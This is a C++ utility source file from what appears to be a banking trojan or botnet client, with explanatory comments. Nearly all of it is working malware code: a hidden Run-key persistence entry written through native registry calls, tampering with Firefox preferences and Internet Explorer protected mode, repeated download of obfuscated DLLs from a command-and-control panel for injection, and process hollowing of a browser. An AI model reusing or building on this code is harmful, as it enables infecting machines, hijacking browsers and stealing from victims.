#include "Utils.h"

char *UnEnc(char *enc, char *key, DWORD encLen)
{
   char *unEnc = (char *) LocalAlloc(LPTR, encLen + 1);
   unEnc[encLen] = 0;
   for(DWORD i = 0; i < encLen; ++i)
      unEnc[i] = enc[i] ^ key[i % lstrlenA(key)];
   return unEnc;
}

ULONG PseudoRand(ULONG *seed)
{
   return (*seed = 1352459 * (*seed) + 2529004207);                                             // undefined behavior; integer overflow
}

void GetBotId(char *botId)
{
   CHAR windowsDirectory[MAX_PATH];
   CHAR volumeName[8] = { 0 };
   DWORD seed = 0;

   if(!Funcs::pGetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))                // path to the Windows directory
      windowsDirectory[0] = L'C';                                                               // 'C' by default
   
   volumeName[0] = windowsDirectory[0];
   volumeName[1] = ':';
   volumeName[2] = '\\';
   volumeName[3] = '\0';

   Funcs::pGetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);                 // volume serial number is used as a seed for a botid
                                                                                                // generation (VSN is unique for each drive)
   GUID guid;
   guid.Data1 =          PseudoRand(&seed);
   
   guid.Data2 = (USHORT) PseudoRand(&seed);                                                     // never used later
   guid.Data3 = (USHORT) PseudoRand(&seed);
   for(int i = 0; i < 8; i++)
      guid.Data4[i] = (UCHAR) PseudoRand(&seed);

   Funcs::pWsprintfA(botId, "%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*) &guid.Data4[2]); // botid is a string containing 12 hex digits followed by
}                                                                                               // an unspecified number of decimal digits

void Obfuscate(BYTE *buffer, DWORD bufferSize, char *key)
{
   for(DWORD i = 0; i < bufferSize; ++i)
      buffer[i] = buffer[i] ^ key[i % Funcs::pLstrlenA(key)];
}

char *Utf16toUtf8(wchar_t *utf16)
{
   if(!utf16)
      return NULL;
   int strLen = Funcs::pWideCharToMultiByte(CP_UTF8, 0, utf16, -1, NULL, 0, NULL, NULL);
   if(!strLen)
      return NULL;
   char *ascii = (char *) Alloc(strLen + 1);
   if(!ascii)
      return NULL;
   Funcs::pWideCharToMultiByte(CP_UTF8, 0, utf16, -1, ascii, strLen, NULL, NULL);
   return ascii;
}

wchar_t *Utf8toUtf16(char *utf8)
{
   if(!utf8)
      return NULL;
   int strLen = Funcs::pMultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
   if(!strLen)
      return NULL;
   wchar_t *converted = (wchar_t *) Alloc((strLen + 1) * sizeof(wchar_t));
   if(!converted)
      return NULL;
   Funcs::pMultiByteToWideChar(CP_UTF8, 0, utf8, -1, converted, strLen);
   return converted;
}

void GetInstallPath(char *installPath)
{
   char botId[BOT_ID_LEN] = { 0 };
   GetBotId(botId);
   Funcs::pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, installPath);                         // saves path to appdata folder
   Funcs::pLstrcatA(installPath, Strs::fileDiv);
   Funcs::pLstrcatA(installPath, botId);                                                        // path to appdata + '\' + botId 

   Funcs::pCreateDirectoryA(installPath, NULL);                                                 // creates botid directory with default
                                                                                                // security descriptor
   Funcs::pLstrcatA(installPath, Strs::fileDiv);
   Funcs::pLstrcatA(installPath, botId);
   Funcs::pLstrcatA(installPath, Strs::exeExt);                                                 // installPath + '\' + '.exe'
}

BOOL GetUserSidStr(PCHAR *sidStr)
{
   DWORD   userNameSize = MAX_PATH;
   char    userName[MAX_PATH] = { 0 };
   Funcs::pGetUserNameExA(NameSamCompatible, userName, &userNameSize);                          // gets username associated with the calling thread

   SID         *sid;                                                                            // SID is necessary to address regestry keys
   SID_NAME_USE peUse;
   char        *refDomainName;                                                                  // user domain name (probably a local group)
   DWORD        sidSize           = 0;
   DWORD        refDomainNameSize = 0;
   BOOL         success           = FALSE;

   Funcs::pLookupAccountNameA(NULL, userName, NULL, &sidSize, NULL, &refDomainNameSize, &peUse);// tries to retrieve user SID and domain name
   if(Funcs::pGetLastError() == ERROR_INSUFFICIENT_BUFFER)                                      // checks if there was enough space
   {
      sid           = (SID *)  Alloc(sidSize);                                                  // allocates exact amount of space in case of failure
      refDomainName = (char *) Alloc(refDomainNameSize * sizeof(wchar_t));
      if(sid && refDomainName)
      {
         if(Funcs::pLookupAccountNameA(NULL, userName, sid, &sidSize, refDomainName, &refDomainNameSize, &peUse))  
         {                                                                                      // retrieves user SID and domain name
            if(Funcs::pConvertSidToStringSidA(sid, sidStr))                                     // converts SID to a compact format
               success = TRUE;
         }
      }
   }
   Funcs::pFree(refDomainName);
   Funcs::pFree(sid);
   return success;
}

HANDLE NtRegOpenKey(PCHAR subKey)
{
   char     key[MAX_PATH] = { 0 };
   char    *sid           = NULL;
   HANDLE   hKey          = NULL;

   if(GetUserSidStr(&sid))                                                                      // if user SID is retrieved successfully
   {
      Funcs::pWsprintfA(key, Strs::ntRegPath, sid, subKey);                                     // buffer key contains path to the required subkey
                                                                                                // formatted as "\\Registry\\User\\%s\\%s"
      UNICODE_STRING uKey;
      uKey.Buffer        = Utf8toUtf16(key);
      uKey.Length        = (USHORT) Funcs::pLstrlenA(key) * sizeof(wchar_t);
      uKey.MaximumLength = uKey.Length;
     
      OBJECT_ATTRIBUTES objAttribs;
      
      objAttribs.Length                     = sizeof(objAttribs);
      objAttribs.Attributes               = OBJ_CASE_INSENSITIVE;
      objAttribs.ObjectName               = &uKey;
      objAttribs.RootDirectory               = NULL;
      objAttribs.SecurityDescriptor         = NULL;                                             // supposedly, security information
      objAttribs.SecurityQualityOfService = 0;                                                  // is ignored by NtOpenKey
      
      Funcs::pNtOpenKey(&hKey, KEY_ALL_ACCESS, &objAttribs);                                    // receives the handle to the key
   }
   Funcs::pLocalFree(sid);
   return hKey;
}

NTSTATUS NtRegSetValue(HANDLE hKey, BYTE *valueName, DWORD valueNameSize, DWORD type, BYTE *data, DWORD dataSize)
{
   UNICODE_STRING uValueName;
   uValueName.Buffer        = (wchar_t *) valueName;
   uValueName.Length        = (USHORT) valueNameSize;
   uValueName.MaximumLength = uValueName.Length;
   return Funcs::pNtSetValueKey(hKey, &uValueName, NULL, type, data, dataSize);                 // replaces the value pointed by ValueName in the key
                                                                                                // referenced by hKey with some data
}                                                                                               // type -- type of data to be written
                                                                                                // data -- pointer to the buffer with data
void SetStartupValue(char *path)
{
   HANDLE hKey = NtRegOpenKey(Strs::userRunKey);                                                // gets the handle to the registry key named
   char botId[BOT_ID_LEN] = { 0 };                                                              // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
   GetBotId(botId);

   DWORD    botIdLen   = Funcs::pLstrlenA(botId);
   DWORD    botIdSizeW = botIdLen * sizeof(wchar_t);
   wchar_t *botIdW = Utf8toUtf16(botId);
   wchar_t  regValueName[128] = { 0 };
   regValueName[0] = 0;

   Funcs::pMemcpy(regValueName + 1, botIdW, botIdSizeW);
   regValueName[botIdLen + 1] = 0;                                                              // the name of a registry value: botid + botidsize (null-terminated string)
   Funcs::pFree(botIdW);

   wchar_t *pathW     = Utf8toUtf16(path);
   DWORD    pathWsize = Funcs::pLstrlenA(path) * sizeof(wchar_t);

   NtRegSetValue(hKey, (BYTE *) regValueName, botIdSizeW + sizeof(wchar_t), REG_SZ, (BYTE *) pathW, pathWsize);
                                                                                                // adds a new value to the Run key that contains bot PE path
   Funcs::pFree(pathW);                                                                         // this way, bot is added to the list of startup applications
   Funcs::pCloseHandle(hKey);                             
}

BOOL VerifyPe(BYTE *pe, DWORD peSize)
{
   if(peSize > 1024 && pe[0] == 'M' && pe[1] == 'Z')
      return TRUE;
   return FALSE;
}

BOOL IsProcessX64(HANDLE hProcess)
{
   SYSTEM_INFO systemInfo;                                                                      // structure that stores info about architecture, processors, etc
   Funcs::pGetNativeSystemInfo(&systemInfo);                                                    // gets system info to check if it is x64
   if(systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
      return FALSE;

   BOOL wow64;
   Funcs::pIsWow64Process(hProcess, &wow64);
   if(wow64)
      return FALSE;
    
   return TRUE;
}

void *AllocZ(size_t size)
{
   void *mem = Alloc(size);
   Funcs::pMemset(mem, 0, size);
   return mem;
}

void *Alloc(size_t size)
{
   void *mem = Funcs::pMalloc(size);
   return mem;
}

void *ReAlloc(void *mem2realloc, size_t size)
{   
   void *mem = Funcs::pRealloc(mem2realloc, size);
   return mem;
}

#pragma function(memset)
void * __cdecl memset(void *pTarget, int value, size_t cbTarget)
{
   unsigned char *p = static_cast<unsigned char *>(pTarget);
   while(cbTarget-- > 0)
   {
      *p++ = static_cast<unsigned char>(value);
   }
   return pTarget;
}

DWORD GetPidExplorer()
{
   for(;;)
   {
      HWND hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);                               // returns handle to a taskbar (shell_TrayWnd)
      if(hWnd)
      {
         DWORD pid;
         Funcs::pGetWindowThreadProcessId(hWnd, &pid);                                          // sets taskbar thread id to pid
         return pid;
      }
      Sleep(500);                                                                               // if unsuccessful then sleeps and tries again
   }
}

void SetFirefoxPrefs()
{
   char appData[MAX_PATH];
   if(Funcs::pExpandEnvironmentStringsA(Strs::exp1, appData, MAX_PATH) > 0)                     // gets user-specific path to appdata folder
   {
      char ffDir[MAX_PATH];
      Funcs::pWsprintfA(ffDir, Strs::exp2, appData, Strs::exp3, Strs::exp4, Strs::exp5);        // writes "%appdata%\Mozilla\Firefox\Profiles.ini" to buffer
      if(ffDir)                                                                                 
      {
         char sections[1024] = { 0 };
         if(Funcs::pGetPrivateProfileSectionNamesA(sections, sizeof(sections), ffDir) > 0)      // gets all sections from Profiles.ini (one or
         {                                                                                      // more null-terminated strings)
            char *entry = sections;
            for(;;)
            {
               if(Funcs::pStrncmp(entry, Strs::exp6, 7) == 0)                                   // if entry equals "Profile"
               {  
                  char randomDir[MAX_PATH]; 
                  if(Funcs::pGetPrivateProfileStringA(entry, Strs::exp7, 0, randomDir, MAX_PATH, ffDir) > 0)    
                  {                                                                             // receives a value by key "path" in section "Profile" and
                     int nPos = 0;                                                              // checks if it worked by comparing to 0
                     for(; nPos < 64; ++nPos)
                     {
                        if(randomDir[nPos] == '/')
                        {
                           Funcs::pMemcpy(randomDir, randomDir + nPos + 1, (sizeof randomDir - nPos) + 1);
                           break;                                                               // removes everything before the first '\' and
                                                                                                // copies the rest to randomDir. ("RandomDir" since Mozilla generates
                        }                                                                       // name in a random manner)
                     }                                                                          // Note: this way it works only with default firefox profile.
                     Funcs::pMemset(ffDir, 0, MAX_PATH);
   
                     Funcs::pWsprintfA(ffDir, Strs::exp8, appData,                              // writes the folowing path to buffer:
                          Strs::exp3,  Strs::exp4, Strs::exp5, randomDir, Strs::exp9);          // %appdata%\Mozilla\Firefox\Profiles\RandomDir\prefs.js
             
                     if(ffDir)
                     {
                        HANDLE ffPrefs = Funcs::pCreateFileA                                
                        (
                           ffDir, GENERIC_READ | GENERIC_WRITE, 0, 0, 
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
                        );                                                                      // success if prefs.js already exists
                
                        if(ffPrefs != INVALID_HANDLE_VALUE)                                     //
                        {
                           DWORD fileSize = Funcs::pGetFileSize(ffPrefs, NULL);
                           char *fBuffer  = (CHAR *) Alloc(fileSize + 1);                       // allocates space for a new buffer
                           DWORD bRead, bWritten;
                           if(Funcs::pReadFile(ffPrefs, fBuffer, fileSize, &bRead, NULL) == TRUE)
                           {                                                                    // reads prefs.js into buffer
                              fBuffer[bRead] = '\0';                                            // puts terminator at the end

                              char botId[BOT_ID_LEN] = { 0 };
                              GetBotId(botId);
                            
                              char botIdComment[BOT_ID_LEN + 10] = { 0 };
                              botIdComment[0] = '#';
                              Funcs::pLstrcatA(botIdComment, botId);
                              Funcs::pLstrcatA(botIdComment, Strs::winNewLine);                 // botid + '#' + newline

                              if(!Funcs::pStrStrA(fBuffer, botIdComment))
                              {                                                                 
                                 Funcs::pWriteFile(ffPrefs, Strs::exp12, Funcs::pLstrlenA(Strs::exp12), &bWritten, NULL);
                                                                                                // exp12 is written into prefs.js (changes to be made to Firefox settings)
                                 Funcs::pWriteFile(ffPrefs, botIdComment, Funcs::pLstrlenA(botIdComment), &bWritten, NULL);
                              }
                              Funcs::pCloseHandle(ffPrefs);                                     // closes handle if exp12 is written to prefs.js
                              return;
                           }  
                           Funcs::pFree(fBuffer);                                           
                        }
                        Funcs::pCloseHandle(ffPrefs);                                           // closes handle if no prefs.js found
                        return;
                     }
                  }
               }
               
               entry += Funcs::pLstrlenA(entry) + 1;                                            // continues search if "Profile" section is not found yet
               if(!entry[0])                                                                    // stops if two subsequent '\0' are met. (the last section
                  break;                                                                        // is marked with two '\0' by convention)
            }
         }
      }
   }
}

void DisableMultiProcessesAndProtectedModeIe()
{
   HKEY  result;
   DWORD data = 0;
   if(Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::exp13, 0, KEY_ALL_ACCESS, &result) == ERROR_SUCCESS)
   {
      Funcs::pRegSetValueExA(result, Strs::exp14, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
      data = 1;
      Funcs::pRegSetValueExA(result, Strs::exp19, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
      Funcs::pRegCloseKey(result);
   }
   if(Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::exp15, 0, KEY_ALL_ACCESS, &result) == ERROR_SUCCESS)
   {
      data = 3;
      Funcs::pRegSetValueExA(result, Strs::exp16, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
      Funcs::pRegCloseKey(result);
   }
}

void CopyDir(char *from, char *to)
{
   char fromWildCard[MAX_PATH] = { 0 };
   Funcs::pLstrcpyA(fromWildCard, from);
   Funcs::pLstrcatA(fromWildCard, "\\*");

   if(!Funcs::pCreateDirectoryA(to, NULL) && Funcs::pGetLastError() != ERROR_ALREADY_EXISTS)
      return;
   WIN32_FIND_DATAA findData;
   HANDLE hFindFile = Funcs::pFindFirstFileA(fromWildCard, &findData);
   if(hFindFile == INVALID_HANDLE_VALUE)
      return;

   do
   {
      char currFileFrom[MAX_PATH] = { 0 };
      Funcs::pLstrcpyA(currFileFrom, from);
      Funcs::pLstrcatA(currFileFrom, "\\");
      Funcs::pLstrcatA(currFileFrom, findData.cFileName);

      char currFileTo[MAX_PATH] = { 0 };
      Funcs::pLstrcpyA(currFileTo, to);
      Funcs::pLstrcatA(currFileTo, "\\");
      Funcs::pLstrcatA(currFileTo, findData.cFileName);

      if
      (
         findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && 
         Funcs::pLstrcmpA(findData.cFileName, ".") && 
         Funcs::pLstrcmpA(findData.cFileName, "..")
      )
      {
         if(Funcs::pCreateDirectoryA(currFileTo, NULL) || Funcs::pGetLastError() == ERROR_ALREADY_EXISTS)
            CopyDir(currFileFrom, currFileTo);
      }
      else
         Funcs::pCopyFileA(currFileFrom, currFileTo, FALSE);
   } while(Funcs::pFindNextFileA(hFindFile, &findData));
}

//todo: better error handling

static BYTE *ReadDll(char *path, char *botId)
{
   HANDLE hFile = Funcs::pCreateFileA
   (
      path, 
      GENERIC_READ, 
      0, 
      NULL, 
      OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );
   if(hFile == INVALID_HANDLE_VALUE)                                                            // can't open file for reading
      return NULL;

   DWORD fileSize = Funcs::pGetFileSize(hFile, NULL);
   if(fileSize < 1024)
      return NULL;

   BYTE *contents = (BYTE *) Alloc(fileSize);                                                   // dynamically allocates bytes
   DWORD read;
   Funcs::pReadFile(hFile, contents, fileSize, &read, NULL);                                    // receives file's data into contents
   Obfuscate(contents, fileSize, botId);                                                        // deobfuscates
   if(!VerifyPe(contents, fileSize))                                                            
   {
      Funcs::pFree(contents);
      contents = NULL;
   }
   Funcs::pCloseHandle(hFile);
   return contents;                                                                             // file's data if success, NULL otherwise
}

static void DownloadDll(char *path, BOOL x64, char *botId)
{
   char command[32] = { 0 };
   if(!x64)
      Funcs::pLstrcpyA(command, Strs::dll32binRequest);                                         // command contains "bin|int32"
   else
      Funcs::pLstrcpyA(command, Strs::dll64binRequest);

   int   dllSize;
   BYTE *dll;
   for(;;)
   {
      dll = (BYTE *) PanelRequest(command, &dllSize);                                           // dll contains data to be injected 
      if(VerifyPe(dll, dllSize))                                                                // checks if dll is large enough, if is starts with "MZ"
         break;
      Funcs::pFree(dll);                                                                        // cleans garbage if unsuccessful
      Funcs::pSleep(POLL);
   }
   Obfuscate(dll, dllSize, botId);                                                              // obfuscates dll to safely store it on a victim pc
   HANDLE hFile = Funcs::pCreateFileA                                                           // handle to the file where obfuscated dll will be stored
   (
      path, 
      GENERIC_WRITE, 
      0, 
      NULL, 
      CREATE_ALWAYS, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );
   DWORD written;
   Funcs::pWriteFile(hFile, dll, dllSize, &written, NULL);                                      // writes dll into memory
   Funcs::pCloseHandle(hFile);
   Funcs::pFree(dll);
}

void GetTempPathBotPrefix(char *path)
{
   Funcs::pGetTempPathA(MAX_PATH, path);                                                        // retrieves path to directory of temporary files
   char botId[BOT_ID_LEN] = { 0 };
   GetBotId(botId);
   Funcs::pLstrcatA(path, botId);                                                               // temp dir + botid
} 

static HANDLE hX86 = NULL;
static HANDLE hX64 = NULL;

void GetDlls(BYTE **x86, BYTE **x64, BOOL update)
{
   char x86cachePath[MAX_PATH] = { 0 };
   char x64cachePath[MAX_PATH] = { 0 };
   char cachePath[MAX_PATH]    = { 0 };
   char botId[BOT_ID_LEN]      = { 0 };
   SYSTEM_INFO info            = { 0 };

   GetBotId(botId);
   Funcs::pGetNativeSystemInfo(&info);                                                          // on versions under XP GetSystemInfo used instead

   GetTempPathBotPrefix(cachePath);                                                             // a temp folder for dlls
   Funcs::pLstrcpyA(x86cachePath, cachePath);
   Funcs::pLstrcatA(x86cachePath, Strs::dll32cachePrefix);

   if(update)                                                                                   // this branch is used to update old x86 dll from C2
   {
      Funcs::pCloseHandle(hX86);                                                                // close the old handle to create a new one
      DownloadDll(x86cachePath, FALSE, botId);
      hX86 = Funcs::pCreateFileA(x86cachePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
   }
   else
   {
      while(!(*x86 = ReadDll(x86cachePath, botId)))                                             // otherwise, tries to download the dll from C2
         DownloadDll(x86cachePath, FALSE, botId);
   }

   if(info.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64 || (x64 == NULL && !update))  // doesn't update or download an x64 dll if
      return;                                                                                   // os doesn't support x64 or if its not required

   Funcs::pLstrcpyA(x64cachePath, cachePath);
   Funcs::pLstrcatA(x64cachePath, Strs::dll64cachePrefix);
    
   if(update)                                                                                   // similar to x86 download process above
   {
      Funcs::pCloseHandle(hX64);
      DownloadDll(x86cachePath, TRUE, botId);
      hX64 = Funcs::pCreateFileA(x64cachePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
   }
   else
   {
      while(!(*x64 = ReadDll(x64cachePath, botId)))
         DownloadDll(x64cachePath, TRUE, botId);
   }
}

DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, char *browserCommandLine)
{
   HANDLE hBrowser = Funcs::pCreateFileA
   (
      browserPath, 
      GENERIC_READ, 
      0, 
      NULL, 
      OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );

   if(hBrowser == INVALID_HANDLE_VALUE)
      return NULL;

   BOOL  ret = NULL;
   DWORD read;
   DWORD browserSize = Funcs::pGetFileSize(hBrowser, NULL);
   BYTE *browser     = (BYTE *) Alloc(browserSize);

   Funcs::pReadFile(hBrowser, browser, browserSize, &read, NULL);
   Funcs::pCloseHandle(hBrowser);

   STARTUPINFOA        startupInfo        = { 0 };
   PROCESS_INFORMATION processInfo        = { 0 };
   if(!processInfoParam)
   {
      Funcs::pCreateProcessA
      (
         browserPath, 
         browserCommandLine, 
         NULL, 
         NULL, 
         FALSE, 
         CREATE_SUSPENDED, 
         NULL, 
         NULL, 
         &startupInfo, 
         &processInfo
      );
   }
   else
      processInfo = *processInfoParam;

   IMAGE_DOS_HEADER         *dosHeader        = (IMAGE_DOS_HEADER *) browser;
   IMAGE_NT_HEADERS         *ntHeaders        = (IMAGE_NT_HEADERS *) (browser + dosHeader->e_lfanew);
   IMAGE_SECTION_HEADER     *sectionHeader    = (IMAGE_SECTION_HEADER *) (ntHeaders + 1);
   PROCESS_BASIC_INFORMATION processBasicInfo = { 0 };
   CONTEXT                   context          = { 0 };
   DWORD                     retSize;

   context.ContextFlags = CONTEXT_FULL;
   if(!Funcs::pGetThreadContext(processInfo.hThread, &context))
      goto exit;

   PVOID remoteAddress = Funcs::pVirtualAllocEx
   (
      processInfo.hProcess, 
      LPVOID(ntHeaders->OptionalHeader.ImageBase), 
      ntHeaders->OptionalHeader.SizeOfImage, 
      0x3000, 
      PAGE_EXECUTE_READWRITE
   );
   if(!Funcs::pWriteProcessMemory(processInfo.hProcess, remoteAddress, browser, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
      goto exit;
   for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
   {
      if(!Funcs::pWriteProcessMemory
      (
         processInfo.hProcess, 
         LPVOID(DWORD64(remoteAddress) + sectionHeader[i].VirtualAddress), 
         browser + sectionHeader[i].PointerToRawData, 
         sectionHeader[i].SizeOfRawData, 
         NULL
      )) goto exit;
   }

   Funcs::pNtQueryInformationProcess(processInfo.hProcess, (LPVOID) 0, &processBasicInfo, sizeof(processBasicInfo), &retSize);

   if(!Funcs::pWriteProcessMemory(processInfo.hProcess, LPVOID(DWORD64(processBasicInfo.PebBaseAddress) + sizeof(LPVOID) * 2), &remoteAddress, sizeof(LPVOID), NULL))
      goto exit;
#ifndef _WIN64
   context.Eax = (DWORD) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
   context.Rcx = (DWORD64) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif

   if(!Funcs::pSetThreadContext(processInfo.hThread, &context))
      goto exit;
   Funcs::pResumeThread(processInfo.hThread);
   ret = processInfo.dwProcessId;
exit:
   Funcs::pCloseHandle(processInfo.hProcess);
   Funcs::pCloseHandle(processInfo.hThread);
   Funcs::pFree(browser);
   return ret;
}
